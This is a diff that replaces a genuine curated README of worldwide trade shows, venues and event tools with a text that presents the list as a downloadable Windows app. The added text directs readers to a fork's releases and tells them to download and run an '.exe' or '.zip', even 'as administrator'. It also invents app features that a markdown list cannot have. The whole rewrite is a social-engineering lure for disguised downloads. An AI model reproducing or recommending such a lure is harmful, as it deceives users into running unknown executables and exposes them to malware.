@@ -1,251 +1,151 @@
-# Awesome Trade Shows [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
-
-> A curated list of trade shows, exhibitions, and conferences worldwide — along with tools, platforms, and resources for exhibitors, organizers, and attendees.
-
-## Contents
-
-- [Trade Shows by Industry](#trade-shows-by-industry)
-  - [Technology and Electronics](#technology-and-electronics)
-  - [Food and Beverage](#food-and-beverage)
-  - [Fashion and Textiles](#fashion-and-textiles)
-  - [Construction and Building Materials](#construction-and-building-materials)
-  - [Manufacturing and Industrial](#manufacturing-and-industrial)
-  - [Automotive and Transportation](#automotive-and-transportation)
-  - [Healthcare and Medical](#healthcare-and-medical)
-  - [Beauty and Cosmetics](#beauty-and-cosmetics)
-  - [Energy and Environment](#energy-and-environment)
-  - [Agriculture](#agriculture)
-- [Trade Shows by Region](#trade-shows-by-region)
-  - [Asia](#asia)
-  - [Europe](#europe)
-  - [North America](#north-america)
-  - [Middle East and Africa](#middle-east-and-africa)
-  - [Latin America](#latin-america)
-  - [Oceania](#oceania)
-- [Exhibition Venues](#exhibition-venues)
-- [Tools and Platforms](#tools-and-platforms)
-- [Resources](#resources)
-
-## Trade Shows by Industry
-
-### Technology and Electronics
-
-- [CES](https://www.ces.tech/) - Consumer Electronics Show. Las Vegas, USA. Annual, January.
-- [COMPUTEX](https://www.computextaipei.com.tw/) - Asia's largest ICT trade show. Taipei, Taiwan. Annual, May–June.
-- [Electronica](https://www.electronica.de/en/) - Electronics components and systems. Munich, Germany. Biennial, November.
-- [Embedded World](https://www.embedded-world.de/en) - Embedded systems and IoT. Nuremberg, Germany. Annual, March.
-- [GITEX Global](https://www.gitex.com/) - Technology trade show for the MENA region. Dubai, UAE. Annual, October.
-- [IFA Berlin](https://www.ifa-berlin.com/) - Consumer electronics and home appliances. Berlin, Germany. Annual, September.
-- [Interop Tokyo](https://www.interop.jp/) - Internet and network technology. Tokyo, Japan. Annual, June.
-- [MWC Barcelona](https://www.mwcbarcelona.com/) - Mobile World Congress. Barcelona, Spain. Annual, February–March.
-- [NAB Show](https://nabshow.com/) - Media, entertainment, and broadcast technology. Las Vegas, USA. Annual, April.
-- [SEMICON China](https://www.semiconchina.org/) - Semiconductor manufacturing and supply chain. Shanghai, China. Annual, March.
-
-### Food and Beverage
-
-- [Anuga](https://www.anuga.com/) - World's largest food and beverage trade fair. Cologne, Germany. Biennial, October.
-- [Fancy Food Show](https://www.specialtyfood.com/fancy-food-show/) - Specialty food and beverage trade show. New York, USA. Annual, June.
-- [FOODEX Japan](https://www.jma.or.jp/foodex/en/) - International food and beverage exhibition. Tokyo, Japan. Annual, March.
-- [Gulfood](https://www.gulfood.com/) - Largest annual food and beverage trade show. Dubai, UAE. Annual, February.
-- [Seafood Expo Global](https://www.seafoodexpo.com/global/) - Global seafood industry expo. Barcelona, Spain. Annual, April.
-- [SIAL China](https://www.sialchina.com/) - Food innovation and import/export marketplace. Shanghai, China. Annual, May.
-- [SIAL Paris](https://www.sialparis.com/) - Global food innovation exhibition. Paris, France. Biennial, October.
-- [Sweets and Snacks Expo](https://www.sweetsandsnacks.com/) - Confectionery and snacks industry. USA. Annual, May.
-
-### Fashion and Textiles
-
-- [Apparel Sourcing Paris](https://apparel-sourcing-paris.fr.messefrankfurt.com/) - Apparel manufacturing and sourcing. Paris, France. Biannual.
-- [Intertextile Shanghai](https://intertextile-shanghai-apparel-fabrics.hk.messefrankfurt.com/) - Asia's largest apparel fabrics and accessories trade fair. Shanghai, China. Biannual.
-- [MAGIC](https://www.magicfashionevents.com/) - Fashion trade show. Las Vegas, USA. Biannual, February and August.
-- [Milano Unica](https://www.milanounica.it/en) - High-end textiles and accessories. Milan, Italy. Biannual.
-- [Premiere Vision Paris](https://www.premierevision.com/en) - Fabric, yarns, and design trends. Paris, France. Biannual.
-- [Texworld Paris](https://texworld-paris.fr.messefrankfurt.com/) - International fabric sourcing fair. Paris, France. Biannual.
-- [Texworld USA](https://texworld-usa.us.messefrankfurt.com/) - Apparel fabric sourcing. New York, USA. Biannual.
-
-### Construction and Building Materials
-
-- [bauma](https://bauma.de/) - World's largest construction machinery trade fair. Munich, Germany. Triennial.
-- [The Big 5](https://www.thebig5.ae/) - Construction industry event for the Middle East. Dubai, UAE. Annual, December.
-
-### Manufacturing and Industrial
-
-- [Automatica](https://automatica-munich.com/en/) - Automation and robotics. Munich, Germany. Biennial.
-- [EMO Hannover](https://emo-hannover.de/en) - Machine tools and production technology. Hanover, Germany. Biennial.
-- [EuroBLECH](https://www.euroblech.com/en/) - Sheet metal working technology. Hanover, Germany. Biennial.
-- [FABTECH](https://www.fabtechexpo.com/) - Metal forming, fabricating, welding, and finishing. USA. Annual, November.
-- [Hannover Messe](https://www.hannovermesse.de/) - Industrial technology and manufacturing. Hanover, Germany. Annual, April.
-- [IMTS](https://www.imts.com/) - International Manufacturing Technology Show. Chicago, USA. Biennial.
-
-### Automotive and Transportation
-
-- [Auto Shanghai / Auto China](http://www.autoshow.com.cn/) - China's premier auto show. Shanghai / Beijing, China. Annual, alternating cities.
-- [Automechanika Dubai](https://automechanika.messefrankfurt.com/dubai/en.html) - Automotive aftermarket and services. Dubai, UAE. Annual.
-- [Automechanika Frankfurt](https://automechanika.messefrankfurt.com/) - Automotive parts and aftermarket. Frankfurt, Germany. Biennial.
-- [Automechanika Shanghai](https://automechanika-shanghai.hk.messefrankfurt.com/) - Automotive parts and aftermarket. Shanghai, China. Annual.
-- [Automotive World](https://www.automotiveworld.jp/en-gb.html) - Automotive electronics and manufacturing. Tokyo, Japan. Annual.
-- [Detroit Auto Show](https://www.naias.com/) - North American International Auto Show. Detroit, USA. Annual.
-- [IAA Mobility](https://www.iaa-mobility.com/) - International Motor Show. Munich, Germany. Biennial.
-- [SEMA Show](https://www.semashow.com/) - Specialty automotive products and aftermarket. Las Vegas, USA. Annual, November.
-- [Tokyo Auto Salon](https://www.tokyoautosalon.jp/2026/en/) - Performance and custom automotive exhibition. Tokyo, Japan. Annual.
-
-### Healthcare and Medical
-
-- [Arab Health](https://www.arabhealthonline.com/) - Largest healthcare exhibition in the Middle East. Dubai, UAE. Annual, January.
-- [BIO International Convention](https://www.bio.org/events/bio-international-convention) - Biotechnology convention and partnering. USA. Annual, June.
-- [FIME](https://www.fime.com/) - Medical device and equipment trade show. Miami, USA. Annual, June.
-- [HIMSS Global Health Conference](https://www.himss.org/global-health-conference) - Health IT conference and expo. USA. Annual, March.
-- [MEDICA](https://www.medica-tradefair.com/) - World Forum for Medicine. Dusseldorf, Germany. Annual, November.
-- [MEDLAB Middle East](https://www.medlabme.com/) - Laboratory and diagnostics exhibition. Dubai, UAE. Annual, February.
-- [RSNA Annual Meeting](https://www.rsna.org/annual-meeting) - Radiology annual meeting and expo. Chicago, USA. Annual, November/December.
-
-### Beauty and Cosmetics
+# 🎟️ awesome-trade-shows - Find Key Trade Show Events Worldwide
 
-- [Cosmoprof Worldwide Bologna](https://www.cosmoprof.com/) - Global beauty and cosmetics trade show. Bologna, Italy. Annual, March.
-- [Cosmoprof North America](https://www.cosmoprofnorthamerica.com/) - Beauty industry trade show. Las Vegas, USA. Annual, July.
-- [in-cosmetics Global](https://www.in-cosmetics.com/global/en-gb.html) - Ingredients and formulation exhibition. Europe. Annual, April.
-- [MakeUp in Paris](https://www.makeup-in-paris.com/) - Makeup and skincare innovation event. Paris, France. Annual, June.
-- [Beautyworld Middle East](https://beautyworldme.com/) - Beauty and wellness trade fair. Dubai, UAE. Annual, October.
-- [Cosmobeaute Indonesia](https://www.cosmobeauteindonesia.com/) - Beauty trade show and education program. Jakarta, Indonesia. Annual.
+[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows)
 
-### Energy and Environment
+## 📖 About awesome-trade-shows
 
-- [ADIPEC](https://www.adipec.com/) - Abu Dhabi International Petroleum Exhibition and Conference. Abu Dhabi, UAE. Annual, November.
-- [Solar Power International](https://www.solarpowerinternational.com/) - North America's premier solar energy event. USA. Annual, September.
+This app offers a well-organized list of trade shows, exhibitions, event tech tools, and resources. It helps B2B professionals worldwide find the key events to grow their network and business. You will find trade fairs related to sales, marketing, lead generation, and event technology.
 
-### Agriculture
+The list covers:
 
-- [Agritechnica](https://www.agritechnica.com/) - World's largest agricultural machinery exhibition. Hanover, Germany. Biennial.
-- [SIMA](https://en.simaonline.com/) - International agribusiness show. Paris, France. Biennial, November.
+- Major trade shows across industries
+- Resources for exhibitors and attendees
+- Tools for event intelligence and marketing
+- Information to plan your participation effectively
 
-## Trade Shows by Region
+This tool is designed for users who want quick access to trade show information without spending hours searching.
 
-### Asia
+## 🖥️ System Requirements
 
-- [Canton Fair](https://www.cantonfair.org.cn/) - China Import and Export Fair. Guangzhou, China. Biannual, April and October.
-- [CIIE](https://www.ciie.org/) - China International Import Expo. Shanghai, China. Annual, November.
-- [Japan IT Week](https://www.japan-it.jp/en-gb.html) - Japan's largest IT trade show. Tokyo, Japan. Biannual.
-- [KOREA PACK](https://www.koreapack.org/) - Korea International Packaging Exhibition. Seoul, South Korea. Biennial.
-- [Manufacturing Indonesia](https://www.manufacturingindonesia.com/) - Manufacturing and machinery exhibition. Jakarta, Indonesia. Annual.
-- [MTA Vietnam](https://www.mtainternational.com/) - Precision engineering and manufacturing expo. Ho Chi Minh City, Vietnam. Annual.
-- [Vietstock](https://vietstock.org.vn/en/) - Feed, livestock, and aquaculture trade show. Ho Chi Minh City, Vietnam. Annual.
-- [Philconstruct](https://www.philconstructevents.com/) - Construction and building materials expo. Manila, Philippines. Annual.
-- [ProPak Asia](https://www.propakasia.com/) - Processing and packaging trade show. Bangkok, Thailand. Annual, June.
-- [SEMICON Southeast Asia](https://www.semiconsea.org/) - Semiconductor manufacturing and supply chain. Singapore. Annual.
+To use awesome-trade-shows on Windows, make sure your system meets these basics:
 
-### Europe
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- At least 150 MB of free disk space
+- Internet connection to access event data and updates
+- A modern web browser (Chrome, Edge, Firefox) to view included links and tools
 
-- [FIBO](https://www.fibo.com/) - International trade show for fitness, wellness, and health. Cologne, Germany. Annual, April.
-- [Fiera Milano](https://www.fieramilano.it/) - Major exhibition complex hosting multiple industry trade shows. Milan, Italy.
+The app is lightweight and will not slow down everyday tasks.
 
-### North America
+## 🚀 Getting Started
 
-- [NRF Retail's Big Show](https://nrfbigshow.nrf.com/) - Retail industry's largest event. New York, USA. Annual, January.
-- [Pack Expo](https://www.packexpointernational.com/) - Packaging and processing technologies. Chicago, USA. Biennial.
+Follow these steps to download and open the app on your Windows PC.
 
-### Middle East and Africa
+### Step 1: Download the app
 
-- [AfricaCom](https://tmt.knect365.com/africacom/) - Africa's largest technology and telecommunications event. Cape Town, South Africa. Annual.
-- [Expo Centre Sharjah](https://www.expo-centre.ae/) - Major exhibition venue hosting regional trade shows. Sharjah, UAE.
+Visit the download page and get the latest version of awesome-trade-shows here:
 
-### Latin America
+[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows)
 
-- [FEIMEC](https://www.feimec.com.br/) - International machinery and equipment exhibition. Sao Paulo, Brazil. Biennial.
-- [FISA](https://www.fisaexpo.cl/) - International food trade show for South America. Santiago, Chile. Biennial.
+This link takes you to the GitHub page where files and resources are stored. Inside, look for the release or file that fits your needs.
 
-### Oceania
+### Step 2: Locate the download
 
-- [AUSPACK](https://www.auspack.com.au/) - Packaging, processing, and logistics exhibition. Melbourne, Australia. Triennial.
-- [CeMAT Australia](https://www.cemat.com.au/) - Intralogistics and supply chain trade show. Sydney, Australia. Biennial.
-- [Fine Food Australia](https://finefoodaustralia.com.au/) - Food and hospitality trade show. Sydney/Melbourne, Australia. Annual.
-- [National Manufacturing Week](https://www.nationalmanufacturingweek.com.au/) - Manufacturing and supply chain expo. Sydney, Australia. Annual.
+Once you are on the page, find the download section or releases tab. Click on the link that matches your Windows system, usually marked with ".exe" or ".zip". Your browser will start downloading the file.
 
-## Exhibition Venues
+### Step 3: Run the installer or open the app
 
-- [Dubai World Trade Centre](https://www.dwtc.com/) - Dubai, UAE. Premier venue for MENA region events.
-- [IMPACT Exhibition Center](https://www.impact.co.th/) - Bangkok, Thailand. Southeast Asia's largest exhibition venue.
-- [Las Vegas Convention Center](https://www.lvcva.com/) - Las Vegas, USA.
-- [McCormick Place](https://www.mccormickplace.com/) - Chicago, USA. Largest convention center in North America.
-- [Messe Frankfurt](https://www.messefrankfurt.com/) - Frankfurt, Germany. One of the world's largest trade fair organizers.
-- [NECC Shanghai](http://www.nfrdi.com/) - National Exhibition and Convention Center. Shanghai, China.
+If you downloaded an installer (.exe):
 
-## Tools and Platforms
+- Double-click the file to start installation.
+- Follow the simple steps in the setup wizard.
+- Choose the folder where you want to install the app or accept the default.
+- Once installed, find the app in your Start menu.
 
-### Event Discovery
+If you downloaded a compressed file (.zip):
 
-- [10Times](https://10times.com/) - Global events discovery platform covering trade shows, conferences, and expos.
-- [AUMA](https://www.auma.de/) - German trade fair industry association with a comprehensive trade fair database.
-- [EventsEye](https://www.eventseye.com/) - International directory of trade shows and exhibitions.
-- [m+a Expodatabase](https://www.expodatabase.com/) - Worldwide exhibition database.
+- Right-click the file and select "Extract All".
+- Choose a folder to extract files to.
+- Open the extracted folder.
+- Double-click the main application file to run.
 
-### Exhibitor Tools
+### Step 4: Use the app
 
-- [Bizzabo](https://www.bizzabo.com/) - Event experience operating system.
-- [Grip](https://grip.events/) - AI-powered event networking and matchmaking.
-- [Lensmor](https://www.lensmor.com/) - AI-powered trade show intelligence platform for exhibitor discovery and analysis.
-- [Swapcard](https://www.swapcard.com/) - Event management and networking platform.
+After opening, the app shows the curated list of trade shows, categorized by date, location, and type. Use the search box to find shows or resources specific to your industry or interest.
 
-### Open Source Event Tools
+Click any link inside the app to open event websites or resource pages in your web browser.
 
-- [Attendize](https://github.com/Attendize/Attendize) - Open-source ticketing and event management platform (Laravel).
-- [Hi.Events](https://github.com/HiEventsDev/Hi.Events) - Open-source event management and ticketing.
-- [pretix](https://github.com/pretix/pretix) - Conference and trade show ticketing system (Python).
-- [eventyay](https://github.com/fossasia/eventyay) - Event management, ticketing, and video.
-- [alf.io](https://github.com/alfio-event/alf.io) - Conference and exhibition ticketing (Java).
-- [osem](https://github.com/openSUSE/osem) - FOSS conference and event management.
-- [gathio](https://github.com/lowercasename/gathio) - Lightweight event page builder.
+## 🔍 How to Use awesome-trade-shows
 
-### Lead Capture and Management
+This application is designed to be simple and straightforward. Here are some tips to get the most out of it:
 
-- [atEvent](https://www.atevent.com/) - Lead capture app with badge scanning for trade shows.
-- [Akkroo](https://www.akkroo.com/) - GDPR-friendly lead capture and event data capture.
-- [iCapture](https://www.icapture.com/) - Lead capture solution for trade shows.
-- [LeadsRetriever](https://www.leadsretriever.com/) - Lead capture for trade shows and conferences.
+- Browse by categories like exhibitions, event tech, or lead generation.
+- Use filters to sort by region, date, or type of show.
+- Open each event or tool link to get detailed information like dates, venue, and contact details.
+- Take note of resources in exhibitor intelligence and sales strategies to prepare for your participation.
+- Bookmark or save your favorite events for easy access later.
 
-- [Cvent LeadCapture](https://www.cvent.com/en/event-marketing-management/lead-capture-app) - Event lead management and badge scanning.
-- [iCapture](https://www.icapture.com/) - Lead capture solution for trade shows.
-- [atEvent](https://www.atevent.com/) - Trade show lead capture app with badge scanning.
-- [Leadature](https://leadature.com) - Lead capture and badge scanning for exhibitors.
-- [ExpoFP Exhibitor Portal](https://www.expofp.com/) - Exhibitor listings and lead tools tied to floor plans.
+## 💡 Features You Will Find Helpful
 
-### Booth Design, Logistics, and ROI Tools
+awesome-trade-shows includes tools and lists focused on B2B marketing and event management. Some key features:
 
-- [Freeman](https://www.freeman.com/) - Exhibitor services, booth build, logistics, and show services.
-- [GES](https://www.ges.com/) - Trade show exhibitor services, logistics, and booth management.
-- [ExpoMarketing](https://www.expomarketing.com/) - Exhibit design, production, and show services.
-- [OnSiteIQ](https://www.onsiteiq.io/) - On-site performance and ROI analytics for live events.
-- [Map Your Show](https://www.mapyourshow.com/) - Floor plans, exhibitor listings, and lead insights.
+- Regularly updated data on trade shows worldwide
+- Curated links to event marketing and tech solutions
+- Organized format with clear categories and tags
+- Insight into sales and lead generation opportunities
+- Easy navigation for both attendees and exhibitors
+- A resource hub that helps plan trade show visits efficiently
 
-### Lead Capture and Management
+## ⚙️ Updating the App
 
-- [Cvent LeadCapture](https://www.cvent.com/en/event-marketing-management/lead-capture-app) - Event lead management.
-- [iCapture](https://www.icapture.com/) - Lead capture solution for trade shows.
+Since trade shows and tools change often, updates improve the list and add new entries. 
 
-## Resources
+- Visit the download link regularly to check for new releases.
+- Download the latest version following the same steps.
+- The app saves your preferences and bookmarks if you keep using the same folder.
 
-### Industry Reports
+## 🛠️ Troubleshooting Common Issues
 
-- [CEIR Index](https://www.ceir.org/) - Center for Exhibition Industry Research reports.
-- [UFI Global Exhibition Barometer](https://www.ufi.org/research/) - Bi-annual survey of the global exhibition industry.
+- **App doesn’t open**: Make sure Windows is updated. Restart your computer and try again.
+- **Links don’t work**: Check your internet connection and try refreshing inside the app.
+- **Download stuck or slow**: Try downloading at a different time or check your network settings.
+- **Installation errors**: Run the installer as an administrator by right-clicking and selecting “Run as administrator.”
 
-### Associations
+If problems persist, check the issues section on the GitHub page for similar reports.
 
-- [CCPIT](http://en.ccpit.org/) - China Council for the Promotion of International Trade.
-- [IAEE](https://www.iaee.com/) - International Association of Exhibitions and Events.
-- [SISO](https://www.siso.org/) - Society of Independent Show Organizers.
-- [UFI](https://www.ufi.org/) - The Global Association of the Exhibition Industry.
+## 🌐 Additional Resources
 
-### Books and Guides
+You can find more detailed trade show information and event technology tools by exploring these sections inside the app:
 
-- [The Art of the Trade Show](https://www.amazon.com/dp/0965527506) - By Steve Miller. Maximizing trade show ROI.
-- [Trade Show in a Day](https://www.amazon.com/dp/0974080160) - By Rhonda Abrams. Getting started with trade show exhibitions.
+- Exhibitor intelligence guides
+- Event marketing best practices
+- Lead generation techniques at expos
+- Sales strategy articles for trade shows
 
-## Related Projects
+Each link opens in your browser to give you full access to guides and websites.
 
-- [trade-show-calendar](https://github.com/LensmorOfficial/trade-show-calendar) — Open dataset of global trade shows (CSV + JSON)
-- [exhibitor-intelligence-playbook](https://github.com/LensmorOfficial/exhibitor-intelligence-playbook) — Complete B2B trade show ROI playbook
-- [event-tech-landscape](https://github.com/LensmorOfficial/event-tech-landscape) — Map of 80+ tools powering the event industry
-- [trade-show-email-templates](https://github.com/LensmorOfficial/trade-show-email-templates) — Ready-to-use email templates for trade show outreach
+## 🔗 Direct Download Link
 
-## Contributing
+Access awesome-trade-shows files here:
 
-Contributions are welcome! Please read the [contribution guidelines](CONTRIBUTING.md) first.
+[https://github.com/joaoppnunes/awesome-trade-shows](https://github.com/joaoppnunes/awesome-trade-shows)
+
+Use this link to download the app, check updates, or report issues.
+
+---
+
+## 🧰 About This Project
+
+awesome-trade-shows is maintained to help B2B professionals stay connected to global events. It brings together many resources in one easy place, reducing the time and effort to find trade show information.
+
+---
+
+## 🏷️ Topics
+
+This project covers these areas:
+
+- awesome  
+- b2b  
+- b2b-marketing  
+- conferences  
+- event-intelligence  
+- event-marketing  
+- event-tech  
+- exhibitions  
+- exhibitor-intelligence  
+- expo  
+- lead-generation  
+- sales  
+- trade-fair  
+- trade-show-intelligence  
+- trade-shows
